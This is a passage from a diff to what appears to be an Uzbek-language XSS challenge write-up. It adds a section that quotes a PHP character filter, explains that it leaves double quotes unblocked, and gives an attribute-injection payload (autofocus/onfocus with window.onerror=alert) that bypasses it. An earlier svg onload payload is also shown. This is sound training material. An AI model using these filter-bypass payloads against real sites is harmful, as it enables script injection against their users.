@@ -99,3 +99,17 @@ Payload:
 ```<svg onload=alert(/XSS/)>```
 
 ![XSS Challange](./images/008-xss.png)
+
+# No Parentheses Again
+## Zaiflik turi: 
+
+Bundaham qavslarni olib tashlashgan lekin oldingi taskga nisbatan qiyinroq
+
+```$escaped = preg_replace("/[`()<>&#]/", "", $_GET['payload']);```
+
+Filter quyidagi belgilarni olib tashlaydi: `` `  (  )  <  >  &  #`` 
+Lekin `"` ni filter bloklamaydi.
+Payload:
+" autofocus tabindex="0" onfocus="window.onerror=alert;throw 'XSS'
+
+![XSS Challange](./images/009-xss.png)
